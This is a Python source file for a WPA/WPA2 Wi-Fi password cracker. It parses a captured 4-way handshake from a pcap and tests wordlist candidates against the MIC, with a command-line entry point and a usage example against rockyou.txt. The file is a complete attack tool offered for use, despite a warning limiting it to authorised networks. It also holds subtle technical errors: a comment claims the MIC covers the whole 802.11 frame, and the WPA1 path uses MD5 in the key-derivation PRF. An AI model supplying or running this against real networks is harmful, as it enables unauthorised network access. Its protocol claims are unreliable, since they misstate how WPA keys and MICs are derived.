"""
WCrack - WPA/WPA2 Handshake Password Cracker
=============================================

Offline dictionary-attack tool for WPA/WPA2 4-way handshakes captured
in a pcap file. It implements the IEEE 802.11i key derivation (PBKDF2
+ PRF-512) to compute the MIC and compares it against the MIC found in
the captured handshake.

WARNING:
    Use only against networks you own or have explicit written
    permission to test. Unauthorized network access is illegal in
    most jurisdictions.

Usage:
    python WCrack.py <bssid> <ssid> <pcap_file> <wordlist>

Arguments:
    bssid    : MAC address of the access point (e.g. AA:BB:CC:DD:EE:FF).
    ssid     : Network name (string).
    pcap_file: Path to a pcap containing the 4-way handshake.
    wordlist : Path to a text file with one candidate password per line.

Example:
    python WCrack.py AA:BB:CC:DD:EE:FF MyWiFi hs.pcap rockyou.txt

Requirements:
    - Python 3
    - Scapy (pip install scapy)
"""

from scapy.all import Dot11, rdpcap, EAPOL
from hashlib import pbkdf2_hmac
import hmac
import sys


class Colors:
    """ANSI color codes for terminal output."""
    HEADER    = '\033[95m'
    BLUE      = '\033[94m'
    CYAN      = '\033[96m'
    GREEN     = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    ENDC      = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'


class WCrack:
    """
    Crack a WPA/WPA2 handshake using a dictionary attack.

    Attributes:
        versicon (int): 2 for WPA2 (HMAC-SHA1), 1 for WPA (HMAC-MD5).
        filename (str): Path to the pcap file containing the handshake.
        bssid (str): AP MAC address.
        ssid (str): Network name.
        wodllist (str): Path to the wordlist file.
        mic_number (int): Which EAPOL-Key message carries the MIC to
            verify against (2 or 3).
        hash (str): Hash algorithm name ("sha1" or "md5").
        eapol (list): The four EAPOL-Key frames extracted from the pcap.
        ANONCE (bytes): AP nonce.
        SNONCE (bytes): Station nonce.
        mic (bytes): Expected MIC.
        mac_station (str): Station MAC address.
        eapol_zero_mic (Packet): Copy of the target frame with the MIC
            field zeroed, used for MIC computation.
    """

    def __init__(self, wodllist, ssid, bssid, filename,
                 versicon=2, mic_number=3):
        """
        Initialize the cracker.

        Args:
            wodllist (str): Path to the wordlist file.
            ssid (str): Network name.
            bssid (str): AP MAC address.
            filename (str): Path to the pcap file.
            versicon (int): 2 for WPA2, 1 for WPA. Default 2.
            mic_number (int): EAPOL message index (2 or 3) to test
                the MIC against. Default 3.
        """
        self.versicon = versicon
        self.filename = filename
        self.bssid = bssid
        self.ssid = ssid
        self.wodllist = wodllist
        self.mic_number = mic_number
        self.hash = "sha1" if versicon == 2 else "md5"

        self.eapol = []
        self.ANONCE = None
        self.SNONCE = None
        self.mic = None
        self.mac_station = None
        self.eapol_zero_mic = None

    # ------------------------------------------------------------------
    # Frame extraction
    # ------------------------------------------------------------------

    def _eapol(self):
        """
        Read the pcap and extract the four EAPOL-Key messages.

        Classification (per IEEE 802.11i):
            Message 1 (AP  -> STA): MIC=0.
            Message 2 (STA -> AP): MIC=1, nonce != 0, encrypted data = 0.
            Message 3 (AP  -> STA): MIC=1, nonce != 0, encrypted data = 1.
            Message 4 (STA -> AP): MIC=1, nonce == 0.
        """
        packets = rdpcap(self.filename)
        eapol_1 = eapol_2 = eapol_3 = eapol_4 = None

        for packet in packets:
            if not (packet.haslayer(Dot11) and packet.haslayer(EAPOL)):
                continue
            if packet[EAPOL].type != 3:
                continue

            if packet[EAPOL].has_key_mic == 0:
                eapol_1 = packet
            elif packet[EAPOL].key_nonce == b'\x00' * 32:
                eapol_4 = packet
            elif packet[EAPOL].encrypted_key_data == 0:
                eapol_2 = packet
            else:
                eapol_3 = packet

        self.eapol = [eapol_1, eapol_2, eapol_3, eapol_4]
        found = sum(1 for e in self.eapol if e is not None)
        print(f"[*] Found {found}/4 EAPOL-Key messages")

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _normalize_mac(mac):
        """Normalize a MAC address to lowercase colon-separated form."""
        return mac.replace("-", ":").replace(".", ":").lower()

    def _getmac(self):
        """
        Return (min, max) of the AP and station MAC addresses as bytes,
        ordered lexicographically, as required by the PRF-512 input.
        """
        ap  = bytes.fromhex(self._normalize_mac(self.bssid).replace(":", ""))
        sta = bytes.fromhex(self._normalize_mac(self.mac_station).replace(":", ""))
        return (sta, ap) if sta < ap else (ap, sta)

    def _prf512(self, key, data):
        """
        IEEE 802.11i PRF-512 based on HMAC.

        Args:
            key (bytes): PMK (32 bytes).
            data (bytes): Concatenation of min/max MAC, min/max nonce.

        Returns:
            bytes: First 64 bytes of the PRF output (PTK).
        """
        result = b''
        for i in range(4):
            result += hmac.new(
                key,
                data + bytes([i]),
                self.hash,
            ).digest()
        return result[:64]

    # ------------------------------------------------------------------
    # Setup
    # ------------------------------------------------------------------

    def set(self):
        """
        Extract frames and populate ANonce, SNonce, MIC, and station MAC.

        Exits with status 1 if the required frames are missing.
        """
        self._eapol()

        if self.eapol[0] is None:
            print("[!] Missing EAPOL message 1 (ANonce).")
            sys.exit(1)
        if self.eapol[1] is None:
            print("[!] Missing EAPOL message 2 (SNonce).")
            sys.exit(1)
        if self.eapol[self.mic_number - 1] is None:
            print(f"[!] Missing EAPOL message {self.mic_number}.")
            sys.exit(1)

        frame = self.eapol[self.mic_number - 1]

        # Zero-out the MIC on a *full copy* of the frame. MIC is
        # computed over the entire 802.11 frame, not just EAPOL.
        self.eapol_zero_mic = frame.copy()
        self.eapol_zero_mic[EAPOL].key_mic = b'\x00' * 16

        self.ANONCE = self.eapol[0][EAPOL].key_nonce
        self.SNONCE = self.eapol[1][EAPOL].key_nonce
        self.mic    = frame[EAPOL].key_mic

        bssid_norm = self._normalize_mac(self.bssid)
        addr1 = self._normalize_mac(frame.addr1)
        addr2 = self._normalize_mac(frame.addr2)
        self.mac_station = addr2 if addr2 != bssid_norm else addr1

        print(f"[*] BSSID:  {self.bssid}")
        print(f"[*] STA:    {self.mac_station}")
        print(f"[*] ANonce: {self.ANONCE.hex()}")
        print(f"[*] SNonce: {self.SNONCE.hex()}")
        print(f"[*] MIC:    {self.mic.hex()}")

    # ------------------------------------------------------------------
    # Cracking
    # ------------------------------------------------------------------

    def Cracker(self, passwords):
        """
        Iterate over candidate passwords and test each against the MIC.

        Args:
            passwords (Iterable[str]): Iterable yielding candidate
                passwords (one per line, newline-terminated).

        Returns:
            str | None: The matching password, or None if none matched.
        """
        mac_min, mac_max = self._getmac()

        if self.ANONCE < self.SNONCE:
            nonce_min, nonce_max = self.ANONCE, self.SNONCE
        else:
            nonce_min, nonce_max = self.SNONCE, self.ANONCE

        label = b"Pairwise Key expansion\x00"
        data  = mac_min + mac_max + nonce_min + nonce_max

        # Precompute the zero-MIC frame bytes once.
        eapol_bytes = bytes(self.eapol_zero_mic)

        count = 0
        for password in passwords:
            password = password.rstrip('\r\n')
            if not password:
                continue
            count += 1

            print(f"\r{Colors.BLUE}Trying #{count}: {password}{Colors.ENDC}",
                  end='', flush=True)

            PMK = pbkdf2_hmac(
                self.hash,
                password.encode('utf-8', errors='ignore'),
                self.ssid.encode('utf-8', errors='ignore'),
                4096,
                32,
            )
            PTK = self._prf512(PMK, label + data)
            calc_mic = hmac.new(PTK[:16], eapol_bytes, self.hash).digest()

            if hmac.compare_digest(calc_mic, self.mic):
                print()
                print(f"{Colors.FAIL}{'*' * 80}{Colors.ENDC}")
                print(f"{Colors.GREEN}[+] Found Password: {password}{Colors.ENDC}")
                print(f"{Colors.FAIL}{'*' * 80}{Colors.ENDC}")
                return password

        print(f"\n{Colors.WARNING}[!] Tried {count} password(s), none matched.{Colors.ENDC}")
        return None

    def start(self):
        """
        Extract the handshake and run the dictionary attack against
        the wordlist provided at construction time.
        """
        self.set()
        with open(self.wodllist, 'r', encoding='utf-8', errors='ignore') as passwords:
            self.Cracker(passwords)


def run_py():
    """CLI entry point: parse arguments and start cracking."""
    if len(sys.argv) < 5:
        print("Usage: python WCrack.py <bssid> <ssid> <pcap_file> <wordlist>")
        sys.exit(1)

    bssid    = sys.argv[1]
    ssid     = sys.argv[2]
    filename = sys.argv[3]
    wodllist = sys.argv[4]

    WCrack(
        wodllist=wodllist,
        ssid=ssid,
        bssid=bssid,
        filename=filename,
    ).start()


if __name__ == "__main__":
    run_py()